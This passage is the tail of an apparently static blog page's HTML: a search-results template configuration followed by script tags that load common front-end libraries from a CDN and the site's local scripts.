pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
